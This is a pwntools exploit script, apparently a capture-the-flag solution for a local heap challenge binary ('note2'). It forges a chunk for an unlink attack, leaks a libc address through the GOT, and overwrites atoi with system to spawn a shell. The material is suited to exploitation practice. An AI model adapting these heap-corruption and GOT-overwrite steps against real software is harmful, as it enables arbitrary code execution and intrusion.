#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template ./note2_patched
from pwn import *

context.terminal = ['tmux', 'splitw', '-h']

# Set up pwntools for the correct architecture
exe = context.binary = ELF(args.EXE or './note2_patched')
libc = ELF('./libc-2.19.so')

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR


def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
start
bp 0x0040101c
c
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
# Arch:     amd64-64-little
# RELRO:    Partial RELRO
# Stack:    Canary found
# NX:       NX enabled
# PIE:      No PIE (0x3fe000)
# RUNPATH:  b'.'

ptr_ptr_array = 0x00602120
ptr_size_array = 0x00602140

def case_1_add(size: bytes, content: bytes):
    io.sendlineafter(b"option--->>\n", b"1")
    io.sendlineafter(b"Input the length of the note content:(less than 128)\n", size)
    io.sendafter(b"Input the note content:\n", content)
    io.recvline()
    
def case_2_print(idx: bytes):
    io.sendlineafter(b"option--->>\n", b"2")
    io.sendlineafter(b"Input the id of the note:\n", idx)
    return io.recvline()[11:-1]

def case_3_edit(idx: bytes, choice: bytes, content: bytes):
    io.sendlineafter(b"option--->>\n", b"3")
    io.sendlineafter(b"Input the id of the note:\n", idx)
    io.sendlineafter(b"do you want to overwrite or append?[1.overwrite/2.append]\n", choice)
    io.sendafter(b"TheNewContents:", content)
    
def case_4_delete(idx: bytes):
    io.sendlineafter(b"option--->>\n", b"4")
    io.sendlineafter(b"Input the id of the note:\n", idx)
    io.recvline()

io = start()

io.sendlineafter(b"Input your name:\n", b"aaaaaaaaaa")
io.sendlineafter(b"Input your address:\n", b"bbbbbbbbbb")

# unlink exploit preparation

print('--------------------------------------------')

fake_chunk_location = ptr_ptr_array
distance_freechunk_to_unlink_chunk = 0x60
chunk_2_size = 0x80

fake_chunk = flat(
    b"a"*0x8, # prev_size
    p64(distance_freechunk_to_unlink_chunk), # size
    fake_chunk_location - 3*0x8, # fd
    fake_chunk_location - 2*0x8, # bk
    b"\n"
)

case_1_add(str(0x40).encode(), fake_chunk)              # chunk 0
print('--------------------------------------------')
case_1_add(str(0).encode(), b"\n")                      # chunk 1
print('--------------------------------------------')
case_1_add(str(chunk_2_size).encode(), b"\n")           # chunk 2
print('--------------------------------------------')
case_4_delete(b"1")                                     # free chunk 1
print('--------------------------------------------')

payload = flat(
    b"a"*0x10, # padding over chunk 2 data
    p64(distance_freechunk_to_unlink_chunk), # chunk 2 - prev_size
    p64(chunk_2_size + 0x10), # chunk 2 - size: overwrite prev_inuse bit
    b"\n"
)

case_1_add(b"0", payload) # chunk 3 but malloced at location of chunk 1, before chunk 2 => can overflow to chunk 2 header

# --- end ---
# unlink
case_4_delete(b"2")
# --- end ---

# from here, ptr_array[0] = &ptr_array[-3]

payload = flat(
    b"a"*0x8*3, # padding
    ptr_ptr_array + 0x8, # overwrite ptr_array[0]
    b"\n"
)
case_3_edit(b"0", b"1", payload + b"\n")

# from here, ptr_array[0] = &ptr_array[1]

# libc base
case_3_edit(b"0", b"1", p64(exe.got['puts']) + b"\n")
leaked_puts = b"\x00"*2 + case_2_print(b'1')[::-1]
leaked_puts = int.from_bytes(leaked_puts)
libc.address = leaked_puts - libc.symbols['puts']

log.success(f"libc base: {hex(libc.address)}")
# --- end ---

# write got['atoi'] = system
case_3_edit(b"0", b"1", p64(exe.got['atoi']) + b"\n")
case_3_edit(b"1", b"1", p64(libc.symbols['system']) + b"\n")

# call atoi("/bin/sh\x00")
io.sendline(b"/bin/sh\n")

io.interactive()

